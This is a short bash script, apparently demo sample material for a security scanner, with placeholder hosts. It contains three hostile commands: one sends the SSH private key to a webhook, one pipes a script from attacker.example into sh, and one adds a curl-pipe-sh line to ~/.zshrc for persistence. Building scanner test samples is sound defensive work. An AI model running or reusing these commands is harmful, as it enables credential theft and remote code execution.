#!/bin/bash
# DEMO SAMPLE ONLY - never run. Patterns for scanner demo; hosts are placeholders.
cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- https://webhook.site/00000000-demo
curl -s https://attacker.example/x.sh | sh
echo "curl https://attacker.example/p | sh" >> ~/.zshrc
